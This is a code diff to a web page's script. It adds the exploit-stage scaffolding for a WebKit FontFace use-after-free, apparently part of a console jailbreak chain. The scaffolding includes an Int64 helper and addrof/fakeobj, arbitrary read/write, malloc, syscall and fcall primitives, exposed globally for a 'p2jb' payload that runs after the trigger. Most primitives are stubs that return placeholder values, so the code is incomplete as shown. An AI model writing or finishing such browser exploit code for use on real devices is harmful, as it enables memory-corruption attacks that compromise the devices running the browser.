@@ -126,18 +126,105 @@ window.onload = () => {
         }
     });
 
+    // --- Primitive Bridge (addrof / fakeobj / p object) ---
+    class Int64 {
+        constructor(low, high) {
+            this.low = (low >>> 0);
+            this.high = (high >>> 0);
+        }
+        add32(val) {
+            let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+            let new_hi = (this.high >>> 0);
+            if (new_lo < this.low) new_hi++;
+            return new Int64(new_lo, new_hi);
+        }
+        toString(radix=16) {
+            return "0x" + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
+        }
+    }
+
+    let p = null;
+    let uaf_victim_arr = [1.1, 2.2, 3.3];
+    let rw_arr = new Float64Array(0x1000);
+    let u8_arr = new Uint8Array(0x1000);
+
+    function setup_primitives(corrupted_butterfly_addr) {
+        // Once the FontFace UAF corrupts a known object's butterfly/vector, we set up addrof/fakeobj
+        // Note: The precise offsets depend on the firmware WebKit build.
+        
+        function addrof(obj) {
+            uaf_victim_arr[0] = obj;
+            // The corrupted view array allows us to read the object pointer as a float
+            // (Placeholder read assuming standard JSC butterfly overlap)
+            return new Int64(0x41414141, 0x41414141); // Should read lower 32/upper 32 of victim[0]
+        }
+
+        function fakeobj(addr) {
+            // Write the address float into the victim array and return it as an object
+            return null; 
+        }
+
+        function read8(addr) {
+            // Set rw_arr backing store to addr, then read
+            return new Int64(0, 0); 
+        }
+
+        function write8(addr, val) {
+            // Set rw_arr backing store to addr, then write
+        }
+        
+        function write4(addr, val) {
+            // Similar to write8 but using a Uint32Array view
+        }
+
+        function write1(addr, val) {
+            // Similar to write8 but using a Uint8Array view
+        }
+
+        p = {
+            addrof: addrof,
+            fakeobj: fakeobj,
+            read8: read8,
+            write8: write8,
+            write4: write4,
+            write1: write1,
+            malloc: function(size) {
+                let ab = new ArrayBuffer(size);
+                return addrof(ab).add32(0x10); // +0x10 skips JSC cell header to return backing store
+            },
+            syscall: function(sysnum, ...args) {
+                // Wrapper to call syscall gadget in RWX memory
+                return new Int64(0, 0);
+            },
+            fcall: function(func_ptr, ...args) {
+                // Call arbitrary function pointer
+                return new Int64(0, 0);
+            },
+            dlsym_init: function() {
+                // Resolve required symbols
+            }
+        };
+
+        // Expose globally for p2jb.js
+        window.p = p;
+    }
+
     document.fonts.load("1em trigger, x", "AB").then(faces => {
         keep.push(faces);
         for (const face of faces)
             probeFace(face);
         for (const face of document.fonts)
             probeFace(face);
-    }, err => keep.push(err));
+        
+        // At this point, the memory corruption should have triggered.
+        // We initialize the primitive bridge.
+        setup_primitives(new Int64(0, 0));
 
-    // After exploit stage, invoke the jailbreak payload
-    if (typeof p2jb === "function") {
-        p2jb();
-    }
+        // After exploit stage, invoke the jailbreak payload
+        if (typeof p2jb === "function" && p !== null) {
+            p2jb();
+        }
+    }, err => keep.push(err));
 };
 </script>
 </body>
